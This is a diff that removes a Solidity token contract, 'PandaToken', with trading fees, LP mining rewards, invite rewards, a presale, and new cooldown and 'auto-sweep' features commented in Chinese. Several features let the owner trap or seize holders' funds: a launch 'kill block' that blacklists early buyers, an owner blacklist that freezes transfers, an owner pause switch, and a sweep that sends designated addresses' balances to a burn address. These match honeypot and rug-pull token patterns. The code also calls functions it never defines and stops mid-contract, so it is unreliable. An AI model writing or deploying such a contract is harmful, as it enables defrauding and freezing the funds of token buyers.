@@ -1,1050 +1,3 @@
-// SPDX-License-Identifier: MIT
-pragma solidity ^0.8.18;
-
-interface IERC20 {
-    function decimals() external view returns (uint256);
-    function symbol() external view returns (string memory);
-    function name() external view returns (string memory);
-    function totalSupply() external view returns (uint256);
-    function balanceOf(address who) external view returns (uint);
-    function transfer(address recipient, uint256 amount) external returns (bool);
-    function allowance(address owner, address spender) external view returns (uint256);
-    function approve(address _spender, uint _value) external;
-    function transferFrom(address _from, address _to, uint _value) external;
-    event Transfer(address indexed from, address indexed to, uint256 value);
-    event Approval(address indexed owner, address indexed spender, uint256 value);
-}
-
-interface ISwapRouter {
-    function factory() external pure returns (address);
-    function WETH() external pure returns (address);
-    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
-        uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
-    ) external;
-    function swapExactTokensForETHSupportingFeeOnTransferTokens(
-        uint256 amountIn, uint256 amountOutMin, address[] calldata path, address to, uint256 deadline
-    ) external;
-    function addLiquidity(
-        address tokenA, address tokenB, uint256 amountADesired, uint256 amountBDesired,
-        uint256 amountAMin, uint256 amountBMin, address to, uint256 deadline
-    ) external returns (uint256 amountA, uint256 amountB, uint256 liquidity);
-    function addLiquidityETH(
-        address token, uint256 amountTokenDesired, uint256 amountTokenMin,
-        uint256 amountETHMin, address to, uint256 deadline
-    ) external payable returns (uint256 amountToken, uint256 amountETH, uint256 liquidity);
-}
-
-interface ISwapFactory {
-    function createPair(address tokenA, address tokenB) external returns (address pair);
-    function getPair(address tokenA, address tokenB) external view returns (address pair);
-}
-
-abstract contract Ownable {
-    address internal _owner;
-    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
-    constructor() {
-        address msgSender = msg.sender;
-        _owner = msgSender;
-        emit OwnershipTransferred(address(0), msgSender);
-    }
-    function owner() public view returns (address) { return _owner; }
-    modifier onlyOwner() { require(_owner == msg.sender); _; }
-    function renounceOwnership() public virtual onlyOwner {
-        emit OwnershipTransferred(_owner, address(0));
-        _owner = address(0);
-    }
-    function transferOwnership(address newOwner) public virtual onlyOwner {
-        require(newOwner != address(0));
-        emit OwnershipTransferred(_owner, newOwner);
-        _owner = newOwner;
-    }
-}
-
-contract TokenDistributor {
-    address public _owner;
-    constructor(address token) {
-        _owner = msg.sender;
-        IERC20(token).approve(msg.sender, uint256(~uint256(0)));
-    }
-    function claimToken(address token, address to, uint256 amount) external {
-        require(msg.sender == _owner);
-        IERC20(token).transfer(to, amount);
-    }
-}
-
-interface ISwapPair {
-    function getReserves() external view returns (uint112 reserve0, uint112 reserve1, uint32 blockTimestampLast);
-    function token0() external view returns (address);
-    function balanceOf(address account) external view returns (uint256);
-    function totalSupply() external view returns (uint256);
-    function sync() external;
-    function skim(address to) external;
-}
-
-contract PandaToken is IERC20, Ownable {
-    mapping(address => uint256) private _balances;
-    mapping(address => mapping(address => uint256)) private _allowances;
-
-    address public fundAddress;
-    string private _name;
-    string private _symbol;
-    uint256 private _decimals;
-    uint256 public kb;
-
-    mapping(address => bool) public _feeWhiteList;
-    mapping(address => bool) public _rewardList;
-
-    uint256 private _tTotal;
-    uint256 public mineRate;
-
-    ISwapRouter public _swapRouter;
-    address public currency;
-    mapping(address => bool) public _swapPairList;
-
-    bool public antiSYNC = true;
-    bool private inSwap;
-
-    uint256 private constant MAX = ~uint256(0);
-    TokenDistributor public _tokenDistributor;
-    TokenDistributor public _LPRewardDistributor;
-
-    uint256 public _buyFundFee;
-    uint256 public _buyLPFee;
-    uint256 public buy_burnFee;
-    uint256 public _sellFundFee;
-    uint256 public _sellLPFee;
-    uint256 public sell_burnFee;
-    uint256 public removeLiquidityFee;
-    uint256 public addLiquidityFee;
-
-    bool public enableAddLiquidity = true;
-
-    uint256 public fristRate;
-    uint256 public secondRate;
-    uint256 public thirdRate;
-    uint256 public leftRate;
-    uint256 public generations;
-    uint256 public _minTransAmount;
-    mapping(address => address) public _inviter;
-    mapping(address => address[]) public _binders;
-    mapping(address => mapping(address => bool)) public _maybeInvitor;
-
-    uint256 public airdropNumbs;
-    bool public currencyIsEth;
-    uint256 public startTradeBlock;
-
-    mapping(address => uint256) private _userLPAmount;
-    address public _lastMaybeAddLPAddress;
-    uint256 public _lastMaybeAddLPAmount;
-
-    address[] public lpProviders;
-    mapping(address => uint256) public lpProviderIndex;
-    mapping(address => bool) public excludeLpProvider;
-
-    uint256 public minInvitorHoldAmount;
-    uint256 public minLPHoldAmount;
-    uint256 public LPRewardCondition;
-
-    address public _mainPair;
-
-    modifier lockTheSwap() {
-        inSwap = true;
-        _;
-        inSwap = false;
-    }
-
-    bool public enableOffTrade;
-    bool public enableKillBlock;
-    bool public enableRewardList;
-    bool public enableChangeTax;
-    bool public airdropEnable;
-
-    bool public enablePause;
-    bool public pause;
-    bool public enableMint;
-    bool public enableWalletLimit;
-    uint256 public maxWalletAmount;
-
-    uint256 public lastLpBurnTime;
-    uint256 public lpBurnRate;
-    uint256 public lpBurnFrequency;
-
-    bool public presaleEnabled;
-    uint256 public price;
-    uint256 public amountPerUnits;
-    uint256 public mintLimit;
-    uint256 public minted;
-
-    // [NEW] 交易冷却功能相关变量
-    bool public enableCooldown = true;
-    uint256 public buyCooldown = 0;
-    uint256 public sellCooldown = 0;
-    uint256 public globalCooldown = 0;
-    mapping(address => uint256) public lastBuyTime;
-    mapping(address => uint256) public lastSellTime;
-    uint256 public lastGlobalTradeTime;
-
-    // ==================== [NEW] 充值地址自动归集 ====================
-    bool public enableAutoSweep = true;                     // 总开关
-    address[] public nonZeroSweepList;                     // 当前有余额的充值地址列表
-    mapping(address => uint256) public nonZeroIndex;       // 地址在 nonZeroSweepList 中的索引 (+1，0表示不在)
-    mapping(address => bool) public isSweepTarget;         // 是否为充值地址
-    address public sweepTo = address(0xdead);              // 归集目标地址 (0xdead 表示销毁)
-    uint256 public maxSweepPerTx = 1;                      // 每笔交易最多处理几个充值地址
-
-    event AutoNukeLP();
-    event Minted(address indexed to, uint256 amount, uint256 ethAmount);
-    event Refund(address indexed from, uint256 bnb);
-    event AutoSweepExecuted(address indexed target, uint256 amount, address to);
-
-    constructor(
-        string[] memory stringParams,
-        address[] memory addressParams,
-        uint256[] memory numberParams,
-        bool[] memory boolParams
-    ) {
-        _name = stringParams[0];
-        _symbol = stringParams[1];
-        _decimals = numberParams[0];
-        _tTotal = numberParams[1];
-
-        fundAddress = addressParams[0];
-        currency = addressParams[1];
-        _swapRouter = ISwapRouter(addressParams[2]);
-        address ReceiveAddress = addressParams[3];
-
-        enableOffTrade   = boolParams[0];
-        enableKillBlock  = boolParams[1];
-        enableRewardList = boolParams[2];
-        enableChangeTax  = boolParams[3];
-        currencyIsEth    = boolParams[4];
-        airdropEnable    = boolParams[5];
-        enablePause      = boolParams[6];
-        enableMint       = boolParams[7];
-        enableWalletLimit = boolParams[8];
-        presaleEnabled    = boolParams[9];
-
-        _owner = tx.origin;
-
-        IERC20(currency).approve(address(_swapRouter), MAX);
-        _allowances[address(this)][address(_swapRouter)] = MAX;
-
-        ISwapFactory swapFactory = ISwapFactory(_swapRouter.factory());
-        _mainPair = swapFactory.createPair(address(this), currency);
-        _swapPairList[_mainPair] = true;
-
-        _buyFundFee = numberParams[2];
-        _buyLPFee   = numberParams[3];
-        buy_burnFee = numberParams[4];
-
-        _sellFundFee = numberParams[5];
-        _sellLPFee   = numberParams[6];
-        sell_burnFee = numberParams[7];
-
-        mineRate = numberParams[8];
-        LPRewardCondition = numberParams[9];
-        minLPHoldAmount   = numberParams[10];
-        minInvitorHoldAmount = numberParams[11];
-
-        generations = numberParams[12];
-        fristRate   = numberParams[13];
-        secondRate  = numberParams[14];
-        thirdRate   = numberParams[15];
-        leftRate    = numberParams[16];
-
-        kb = numberParams[17];
-        airdropNumbs = numberParams[18];
-        maxWalletAmount = numberParams[19];
-
-        lpBurnRate = numberParams[20];
-        require(lpBurnRate <= 100, "!<=100");
-        lpBurnFrequency = numberParams[21];
-
-        price = numberParams[22];
-        amountPerUnits = numberParams[23];
-        mintLimit = numberParams[24];
-
-        require(
-            _buyFundFee + _buyLPFee + buy_burnFee < 2500 &&
-            _sellFundFee + _sellLPFee + sell_burnFee < 2500 &&
-            airdropNumbs <= 5 &&
-            fristRate + secondRate + thirdRate + leftRate * (generations - 3) == 100
-        );
-
-        _tokenDistributor = new TokenDistributor(currency);
-        _LPRewardDistributor = new TokenDistributor(currency);
-
-        uint256 _mineTotal = _tTotal * mineRate / 100;
-        uint256 presaleAmount = mintLimit * amountPerUnits;
-        require(_mineTotal + presaleAmount <= _tTotal, "presale too high");
-
-        _balances[address(_LPRewardDistributor)] = _mineTotal;
-        emit Transfer(address(0), address(_LPRewardDistributor), _mineTotal);
-
-        _balances[address(this)] = presaleAmount;
-        if (presaleAmount > 0) {
-            emit Transfer(address(0), address(this), presaleAmount);
-        }
-
-        _balances[ReceiveAddress] = _tTotal - _mineTotal - presaleAmount;
-        emit Transfer(address(0), ReceiveAddress, _tTotal - _mineTotal - presaleAmount);
-
-        _feeWhiteList[fundAddress] = true;
-        _feeWhiteList[ReceiveAddress] = true;
-        _feeWhiteList[address(this)] = true;
-        _feeWhiteList[address(_swapRouter)] = true;
-        _feeWhiteList[msg.sender] = true;
-        _feeWhiteList[address(0x000000000000000000000000000000000000dEaD)] = true;
-        _feeWhiteList[address(0)] = true;
-        _feeWhiteList[address(_tokenDistributor)] = true;
-        _feeWhiteList[address(_LPRewardDistributor)] = true;
-
-        excludeLpProvider[address(0)] = true;
-        excludeLpProvider[address(0x000000000000000000000000000000000000dEaD)] = true;
-
-        _addLpProvider(fundAddress);
-    }
-
-    // ========== ERC20 标准方法 ==========
-    function symbol() external view override returns (string memory) { return _symbol; }
-    function name() external view override returns (string memory) { return _name; }
-    function decimals() external view override returns (uint256) { return _decimals; }
-    function totalSupply() public view override returns (uint256) { return _tTotal; }
-
-    function setAntiSYNCEnable(bool s) public onlyOwner { antiSYNC = s; }
-
-    function balanceOf(address account) public view override returns (uint256) {
-        if (account == _mainPair && msg.sender == _mainPair && antiSYNC) {
-            require(_balances[_mainPair] > 0, "!sync");
-        }
-        return _balances[account];
-    }
-
-    function transfer(address recipient, uint256 amount) public override returns (bool) {
-        _transfer(msg.sender, recipient, amount);
-        return true;
-    }
-
-    function allowance(address owner, address spender) public view override returns (uint256) {
-        return _allowances[owner][spender];
-    }
-
-    function approve(address spender, uint256 amount) public override {
-        _approve(msg.sender, spender, amount);
-    }
-
-    function transferFrom(address sender, address recipient, uint256 amount) public override {
-        _transfer(sender, recipient, amount);
-        if (_allowances[sender][msg.sender] != MAX) {
-            _allowances[sender][msg.sender] = _allowances[sender][msg.sender] - amount;
-        }
-    }
-
-    function _approve(address owner, address spender, uint256 amount) private {
-        _allowances[owner][spender] = amount;
-        emit Approval(owner, spender, amount);
-    }
-
-    function setkb(uint256 a) external onlyOwner { kb = a; }
-
-    function isReward(address account) public view returns (uint256) {
-        return _rewardList[account] ? 1 : 0;
-    }
-
-    function setAirDropEnable(bool status) external onlyOwner { airdropEnable = status; }
-
-    function _basicTransfer(address sender, address recipient, uint256 amount) internal returns (bool) {
-        _balances[sender] -= amount;
-        _balances[recipient] += amount;
-        emit Transfer(sender, recipient, amount);
-        return true;
-    }
-
-    function _isAddLiquidity() internal view returns (bool isAdd) {
-        ISwapPair mainPair = ISwapPair(_mainPair);
-        (uint r0, uint256 r1, ) = mainPair.getReserves();
-        address tokenOther = currency;
-        uint256 r = (tokenOther < address(this)) ? r0 : r1;
-        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
-        isAdd = bal > r;
-    }
-
-    function _isRemoveLiquidity() internal view returns (bool isRemove) {
-        ISwapPair mainPair = ISwapPair(_mainPair);
-        (uint r0, uint256 r1, ) = mainPair.getReserves();
-        address tokenOther = currency;
-        uint256 r = (tokenOther < address(this)) ? r0 : r1;
-        uint bal = IERC20(tokenOther).balanceOf(address(mainPair));
-        isRemove = r >= bal;
-    }
-
-    function isContract(address _addr) private view returns (bool) {
-        uint32 size;
-        assembly { size := extcodesize(_addr) }
-        return (size > 0);
-    }
-
-    // ========== 核心转账 ==========
-    function _transfer(address from, address to, uint256 amount) private {
-        require(balanceOf(from) >= amount);
-        require(isReward(from) == 0);
-
-        if (enablePause && pause && !_feeWhiteList[from]) {
-            require(false, "transfers paused");
-        }
-
-        if (!_feeWhiteList[to] && !_swapPairList[to] && isContract(to)) {
-            require(false, "Unknown contract");
-        }
-
-        if (startTradeBlock == 0 && enableOffTrade) {
-            if (!_feeWhiteList[from] && !_feeWhiteList[to] && !_swapPairList[from] && !_swapPairList[to]) {
-                require(!isContract(to), "cant add other lp");
-            }
-        }
-
-        address lastMaybeAddLPAddress = _lastMaybeAddLPAddress;
-        if (lastMaybeAddLPAddress != address(0)) {
-            _lastMaybeAddLPAddress = address(0);
-            uint256 lpBalance = IERC20(_mainPair).balanceOf(lastMaybeAddLPAddress);
-            if (lpBalance > 0) {
-                uint256 lpAmount = _userLPAmount[lastMaybeAddLPAddress];
-                if (lpBalance > lpAmount) {
-                    uint256 debtAmount = lpBalance - lpAmount;
-                    uint256 maxDebtAmount = _lastMaybeAddLPAmount * IERC20(_mainPair).totalSupply() / _balances[_mainPair];
-                    if (debtAmount > maxDebtAmount) {
-                        excludeLpProvider[lastMaybeAddLPAddress] = true;
-                    } else {
-                        _addLpProvider(lastMaybeAddLPAddress);
-                        _userLPAmount[lastMaybeAddLPAddress] = lpBalance;
-                        if (_lastMineLPRewardTimes[lastMaybeAddLPAddress] == 0) {
-                            _lastMineLPRewardTimes[lastMaybeAddLPAddress] = block.timestamp;
-                        }
-                    }
-                }
-            }
-        }
-
-        bool isAdd;
-        bool isRemove;
-        if (_swapPairList[to]) {
-            isAdd = _isAddLiquidity();
-        } else if (_swapPairList[from]) {
-            isRemove = _isRemoveLiquidity();
-        }
-
-        bool isSell = _swapPairList[to] && !isAdd;
-        bool isBuy  = _swapPairList[from] && !isRemove;
-
-        if (isAdd && !_feeWhiteList[from] && !enableAddLiquidity) {
-            require(false, "add liquidity disabled");
-        }
-
-        if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
-            if (airdropEnable && airdropNumbs > 0) {
-                address ad;
-                for (uint256 i = 0; i < airdropNumbs; i++) {
-                    ad = address(uint160(uint256(keccak256(abi.encodePacked(i, amount, block.timestamp)))));
-                    _basicTransfer(from, ad, 1);
-                }
-                amount -= airdropNumbs * 1;
-            }
-            if (amount < _minTransAmount) {
-                amount = 0;
-            }
-        }
-
-        bool takeFee;
-        if (_swapPairList[from] || _swapPairList[to]) {
-            if (!_feeWhiteList[from] && !_feeWhiteList[to]) {
-                if (enableOffTrade) {
-                    require(startTradeBlock > 0 || isAdd);
-                }
-                if (enableOffTrade && enableKillBlock && block.number < startTradeBlock + kb && !_swapPairList[to]) {
-                    _rewardList[to] = true;
-                }
-                if (_swapPairList[to]) {
-                    if (!inSwap && !isAdd) {
-                        if (block.timestamp >= lastLpBurnTime + lpBurnFrequency) {
-                            autoBurnLiquidityPairTokens();
-                        } else {
-                            uint256 contractTokenBalance = balanceOf(address(this));
-                            if (contractTokenBalance > 0) {
-                                uint256 swapFee = _buyFundFee + _buyLPFee + _sellFundFee + _sellLPFee;
-                                uint256 numTokensSellToFund = (amount * swapFee) / 5000;
-                                if (numTokensSellToFund > contractTokenBalance) {
-                                    numTokensSellToFund = contractTokenBalance;
-                                }
-                                swapTokenForFund(numTokensSellToFund, swapFee);
-                            }
-                        }
-                    }
-                }
-                if (!isAdd && !isRemove) takeFee = true;
-            }
-        } else {
-            if (address(0) == _inviter[to] && amount > 0 && from != to) {
-                _maybeInvitor[to][from] = true;
-            }
-            if (address(0) == _inviter[from] && amount > 0 && from != to) {
-                if (_maybeInvitor[from][to] && _binders[from].length == 0) {
-                    _bindInvitor(from, to);
-                }
-            }
-        }
-
-        if (isRemove) {
-            if (!_feeWhiteList[to]) {
-                takeFee = true;
-                uint256 liquidity = (amount * ISwapPair(_mainPair).totalSupply() + 1) / (balanceOf(_mainPair) - 1);
-                if (from != address(_swapRouter)) {
-                    liquidity = (amount * ISwapPair(_mainPair).totalSupply() + 1) / (balanceOf(_mainPair) - amount - 1);
-                }
-                require(_userLPAmount[to] >= liquidity);
-                _userLPAmount[to] -= liquidity;
-            }
-        }
-
-        // [NEW] 交易冷却检查
-        if (enableCooldown && takeFee && !_feeWhiteList[from] && !_feeWhiteList[to]) {
-            if (isBuy) {
-                require(lastSellTime[to] + sellCooldown <= block.timestamp, "Sell cooldown active");
-            }
-            if (isSell) {
-                require(lastBuyTime[from] + buyCooldown <= block.timestamp, "Buy cooldown active");
-            }
-            if (globalCooldown > 0) {
-                require(lastGlobalTradeTime + globalCooldown <= block.timestamp, "Global cooldown active");
-            }
-        }
-
-        _tokenTransfer(from, to, amount, takeFee, isSell, isRemove, isAdd);
-
-        // [NEW] 更新冷却时间记录
-        if (takeFee && !_feeWhiteList[from] && !_feeWhiteList[to]) {
-            if (isBuy) {
-                lastBuyTime[to] = block.timestamp;
-            }
-            if (isSell) {
-                lastSellTime[from] = block.timestamp;
-            }
-            if (globalCooldown > 0 && (isBuy || isSell)) {
-                lastGlobalTradeTime = block.timestamp;
-            }
-        }
-
-        if (from != address(this)) {
-            if (isSell) {
-                _lastMaybeAddLPAddress = from;
-                _lastMaybeAddLPAmount = amount;
-            }
-            if (!_feeWhiteList[from] && !isAdd) {
-                processMineLP(500000);
-            }
-        }
-
-        // [NEW] 自动归集充值地址（每次交易触发一次）
-        _autoSweep();
-    }
-
-    function _tokenTransfer(
-        address sender, address recipient, uint256 tAmount,
-        bool takeFee, bool isSell, bool isRemove, bool isAdd
-    ) private {
-        _balances[sender] = _balances[sender] - tAmount;
-        uint256 feeAmount;
-
-        if (takeFee) {
-            uint256 swapFee = isSell ? (_sellFundFee + _sellLPFee) : (_buyFundFee + _buyLPFee);
-            uint256 swapAmount = (tAmount * swapFee) / 10000;
-            if (swapAmount > 0) {
-                feeAmount += swapAmount;
-                _takeTransfer(sender, address(this), swapAmount);
-            }
-
-            uint256 burnAmount = isSell ? (tAmount * sell_burnFee) / 10000 : (tAmount * buy_burnFee) / 10000;
-            if (burnAmount > 0) {
-                feeAmount += burnAmount;
-                _takeTransfer(sender, address(0xdead), burnAmount);
-            }
-        }
-
-        if (isRemove && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
-            uint256 removeLiquidityFeeAmount = (tAmount * removeLiquidityFee) / 10000;
-            if (removeLiquidityFeeAmount > 0) {
-                feeAmount += removeLiquidityFeeAmount;
-                _takeTransfer(sender, address(this), removeLiquidityFeeAmount);
-            }
-        }
-
-        if (isAdd && !_feeWhiteList[sender] && !_feeWhiteList[recipient]) {
-            uint256 addLiquidityFeeAmount = (tAmount * addLiquidityFee) / 10000;
-            if (addLiquidityFeeAmount > 0) {
-                feeAmount += addLiquidityFeeAmount;
-                _takeTransfer(sender, address(this), addLiquidityFeeAmount);
-            }
-        }
-
-        uint256 netAmount = tAmount - feeAmount;
-
-        if (enableWalletLimit && !_feeWhiteList[recipient]) {
-            require(_balances[recipient] + netAmount <= maxWalletAmount, "wallet limit");
-        }
-
-        _takeTransfer(sender, recipient, netAmount);
-
-        // [NEW] 如果接收地址是充值地址，并且此次转入使其余额从0变正，则加入非零列表
-        if (isSweepTarget[recipient] && netAmount > 0) {
-            // 判断转入前余额是否为0：新余额 == netAmount 说明之前为0
-            if (_balances[recipient] == netAmount) {
-                _addToNonZeroList(recipient);
-            }
-        }
-    }
-
-    function _takeTransfer(address sender, address to, uint256 tAmount) private {
-        _balances[to] = _balances[to] + tAmount;
-        emit Transfer(sender, to, tAmount);
-    }
-
-    // ========== 邀请绑定 ==========
-    function _bindInvitor(address account, address invitor) private {
-        if (invitor != address(0) && invitor != account && _inviter[account] == address(0)) {
-            uint256 size;
-            assembly { size := extcodesize(invitor) }
-            if (size > 0) return;
-            _inviter[account] = invitor;
-            _binders[invitor].push(account);
-        }
-    }
-
-    function getBinderLength(address account) external view returns (uint256) {
-        return _binders[account].length;
-    }
-
-    // ========== 底池燃烧 ==========
-    function autoBurnLiquidityPairTokens() internal {
-        lastLpBurnTime = block.timestamp;
-        uint256 liquidityPairBalance = balanceOf(_mainPair);
-        if (liquidityPairBalance < 100 * 10**_decimals) {
-            return;
-        }
-        uint256 amountToBurn = liquidityPairBalance * lpBurnRate / 10000;
-        if (amountToBurn > 0) {
-            _basicTransfer(_mainPair, address(0xdead), amountToBurn);
-            ISwapPair(_mainPair).sync();
-            emit AutoNukeLP();
-        }
-    }
-
-    function setlpBurnRate(uint256 _rate) external onlyOwner {
-        require(_rate <= 100, "!<=100");
-        lpBurnRate = _rate;
-    }
-
-    function setlpBurnFrequency(uint256 _hour) external onlyOwner {
-        lpBurnFrequency = _hour * 3600;
-    }
-
-    // ========== 预售 ==========
-    receive() external payable {
-        if (presaleEnabled) {
-            mint();
-        }
-    }
-
-    function mint() internal {
-        require(msg.value >= price, "value not match");
-        require(!isContract(msg.sender), "can not mint to contract");
-        require(msg.sender == tx.origin, "can not mint to contract.");
-
-        uint256 units = msg.value / price;
-        uint256 realCost = units * price;
-        uint256 refund = msg.value - realCost;
-
-        require(minted + units <= mintLimit, "exceed max mint");
-        require(units * amountPerUnits <= _balances[address(this)], "not enough balance");
-
-        _basicTransfer(address(this), msg.sender, units * amountPerUnits);
-        minted += units;
-
-        emit Minted(msg.sender, units * amountPerUnits, realCost);
-
-        if (refund > 0) {
-            payable(msg.sender).transfer(refund);
-            emit Refund(msg.sender, refund);
-        }
-    }
-
-    function setPresaleEnabled(bool _enabled) external onlyOwner {
-        presaleEnabled = _enabled;
-    }
-
-    function setMintLimit(uint256 newValue) external onlyOwner { mintLimit = newValue; }
-    function setPrice(uint256 newValue) external onlyOwner { price = newValue; }
-    function setAmountPerUnits(uint256 newValue) external onlyOwner { amountPerUnits = newValue; }
-
-    // ========== 手续费兑换 ==========
-    event Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(uint256 value);
-    event Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();
-    event Failed_addLiquidityETH();
-    event Failed_addLiquidity();
-
-    function swapTokenForFund(uint256 tokenAmount, uint256 swapFee) private lockTheSwap {
-        if (swapFee == 0) return;
-        swapFee += swapFee;
-        uint256 lpFee = _sellLPFee + _buyLPFee;
-        uint256 lpAmount = (tokenAmount * lpFee) / swapFee;
-
-        address[] memory path = new address[](2);
-        path[0] = address(this);
-        path[1] = currency;
-
-        if (currencyIsEth) {
-            try _swapRouter.swapExactTokensForETHSupportingFeeOnTransferTokens(
-                tokenAmount - lpAmount, 0, path, address(this), block.timestamp
-            ) {} catch {
-                emit Failed_swapExactTokensForETHSupportingFeeOnTransferTokens();
-            }
-        } else {
-            try _swapRouter.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-                tokenAmount - lpAmount, 0, path, address(_tokenDistributor), block.timestamp
-            ) {} catch {
-                emit Failed_swapExactTokensForTokensSupportingFeeOnTransferTokens(1);
-            }
-        }
-
-        swapFee -= lpFee;
-        IERC20 FIST = IERC20(currency);
-
-        uint256 fistBalance;
-        uint256 lpFist;
-        uint256 fundAmount;
-
-        if (currencyIsEth) {
-            fistBalance = address(this).balance;
-            lpFist = (fistBalance * lpFee) / swapFee;
-            fundAmount = fistBalance - lpFist;
-            if (fundAmount > 0 && fundAddress != address(0)) {
-                payable(fundAddress).transfer(fundAmount);
-            }
-            if (lpAmount > 0 && lpFist > 0) {
-                try _swapRouter.addLiquidityETH{value: lpFist}(
-                    address(this), lpAmount, 0, 0, fundAddress, block.timestamp
-                ) {} catch { emit Failed_addLiquidityETH(); }
-            }
-        } else {
-            fistBalance = FIST.balanceOf(address(_tokenDistributor));
-            lpFist = (fistBalance * lpFee) / swapFee;
-            fundAmount = fistBalance - lpFist;
-
-            if (lpFist > 0) FIST.transferFrom(address(_tokenDistributor), address(this), lpFist);
-            if (fundAmount > 0) FIST.transferFrom(address(_tokenDistributor), fundAddress, fundAmount);
-
-            if (lpAmount > 0 && lpFist > 0) {
-                try _swapRouter.addLiquidity(
-                    address(this), currency, lpAmount, lpFist, 0, 0, fundAddress, block.timestamp
-                ) {} catch { emit Failed_addLiquidity(); }
-            }
-        }
-    }
-
-    // ========== 管理员功能 ==========
-    function setFundAddress(address addr) external onlyOwner {
-        fundAddress = addr;
-        _feeWhiteList[addr] = true;
-        _addLpProvider(addr);
-    }
-
-    function launch() external onlyOwner {
-        require(0 == startTradeBlock);
-        startTradeBlock = block.number;
-        lastLpBurnTime = block.timestamp;
-    }
-
-    function setFeeWhiteList(address[] calldata addr, bool enable) public onlyOwner {
-        for (uint256 i = 0; i < addr.length; i++) {
-            _feeWhiteList[addr[i]] = enable;
-        }
-    }
-
-    function completeCustoms(uint256[] calldata customs) external onlyOwner {
-        require(enableChangeTax);
-        _buyFundFee = customs[0];
-        _buyLPFee   = customs[1];
-        buy_burnFee = customs[2];
-        _sellFundFee = customs[3];
-        _sellLPFee   = customs[4];
-        sell_burnFee = customs[5];
-        require(
-            _buyFundFee + _buyLPFee + buy_burnFee < 2500 &&
-            _sellFundFee + _sellLPFee + sell_burnFee < 2500
-        );
-    }
-
-    function changeInviteRate(uint256[] calldata customs) external onlyOwner {
-        generations = customs[0];
-        fristRate  = customs[1];
-        secondRate = customs[2];
-        thirdRate  = customs[3];
-        leftRate   = customs[4];
-        require(fristRate + secondRate + thirdRate + leftRate * (generations - 3) == 100);
-    }
-
-    function multi_bclist(address[] calldata addresses, bool value) public onlyOwner {
-        require(enableRewardList);
-        require(addresses.length < 201);
-        for (uint256 i; i < addresses.length; ++i) {
-            _rewardList[addresses[i]] = value;
-        }
-    }
-
-    function setMinTransAmount(uint256 newValue) external onlyOwner { _minTransAmount = newValue; }
-    function disableChangeTax() public onlyOwner { enableChangeTax = false; }
-    function setSwapPairList(address addr, bool enable) external onlyOwner { _swapPairList[addr] = enable; }
-
-    function claimBalance() external { payable(fundAddress).transfer(address(this).balance); }
-
-    function claimToken(address token, uint256 amount, address to) external {
-        require(fundAddress == msg.sender);
-        IERC20(token).transfer(to, amount);
-    }
-
-    function claimContractToken(address contractAddress, address token, uint256 amount) external {
-        require(fundAddress == msg.sender);
-        TokenDistributor(contractAddress).claimToken(token, fundAddress, amount);
-    }
-
-    function setAddLiquidityFee(uint256 newValue) external onlyOwner {
-        require(newValue <= 5000, "fee too high");
-        addLiquidityFee = newValue;
-    }
-
-    function setRemoveLiquidityFee(uint256 newValue) external onlyOwner {
-        require(newValue <= 5000, "fee too high");
-        removeLiquidityFee = newValue;
-    }
-
-    function setEnableAddLiquidity(bool _enabled) external onlyOwner {
-        enableAddLiquidity = _enabled;
-    }
-
-    // ========== LP 挖矿 ==========
-    function getLPProviderLength() public view returns (uint256) { return lpProviders.length; }
-
-    function _addLpProvider(address adr) private {
-        if (0 == lpProviderIndex[adr]) {
-            if (0 == lpProviders.length || lpProviders[0] != adr) {
-                uint256 size;
-                assembly { size := extcodesize(adr) }
-                if (size > 0) return;
-                lpProviderIndex[adr] = lpProviders.length;
-                lpProviders.push(adr);
-            }
-        }
-    }
-
-    uint256 public _currentMineLPIndex;
-    uint256 public _progressMineLPBlock;
-    uint256 public _progressMineLPBlockDebt = 100;
-    mapping(address => uint256) public _lastMineLPRewardTimes;
-    uint256 public _mineLPRewardTimeDebt = 24 hours;
-
-    function processMineLP(uint256 gas) private {
-        if (_progressMineLPBlock + _progressMineLPBlockDebt > block.number) return;
-        uint totalPair = IERC20(_mainPair).totalSupply();
-        if (0 == totalPair) return;
-        address sender = address(_LPRewardDistributor);
-        if (_balances[sender] < 2 * LPRewardCondition) return;
-
-        address shareHolder;
-        uint256 pairBalance;
-        uint256 lpAmount;
-        uint256 amount;
-        uint256 gasUsed = 0;
-        uint256 iterations = 0;
-        uint256 gasLeft = gasleft();
-
-        while (gasUsed < gas && iterations < lpProviders.length) {
-            if (_currentMineLPIndex >= lpProviders.length) _currentMineLPIndex = 0;
-            shareHolder = lpProviders[_currentMineLPIndex];
-            if (!excludeLpProvider[shareHolder]) {
-                pairBalance = IERC20(_mainPair).balanceOf(shareHolder);
-                lpAmount = _userLPAmount[shareHolder];
-                if (lpAmount < pairBalance) pairBalance = lpAmount;
-                if (pairBalance >= minLPHoldAmount && block.timestamp > _lastMineLPRewardTimes[shareHolder] + _mineLPRewardTimeDebt) {
-                    amount = LPRewardCondition * pairBalance / totalPair;
-                    if (amount > 0) {
-                        _tokenTransfer(sender, shareHolder, amount, false, false, false, false);
-                        _lastMineLPRewardTimes[shareHolder] = block.timestamp;
-                        _distributeLPInviteReward(shareHolder, amount, sender);
-                    }
-                }
-            }
-            gasUsed = gasUsed + (gasLeft - gasleft());
-            gasLeft = gasleft();
-            _currentMineLPIndex++;
-            iterations++;
-        }
-        _progressMineLPBlock = block.number;
-    }
-
-    function _distributeLPInviteReward(address current, uint256 reward, address sender) private {
-        address invitor;
-        uint256 invitorAmount;
-        for (uint256 i; i < generations;) {
-            invitor = _inviter[current];
-            if (address(0) == invitor) break;
-            if (i == 0) invitorAmount = reward * fristRate / 100;
-            else if (i == 1) invitorAmount = reward * secondRate / 100;
-            else if (i == 2) invitorAmount = reward * thirdRate / 100;
-            else invitorAmount = reward * leftRate / 100;
-            if (_balances[invitor] >= minInvitorHoldAmount) {
-                _tokenTransfer(sender, invitor, invitorAmount, false, false, false, false);
-            }
-            current = invitor;
-            unchecked { ++i; }
-        }
-    }
-
-    function setExcludeLPProvider(address addr, bool enable) external onlyOwner { excludeLpProvider[addr] = enable; }
-    function setLPRewardCondition(uint256 amount) external onlyOwner { LPRewardCondition = amount; }
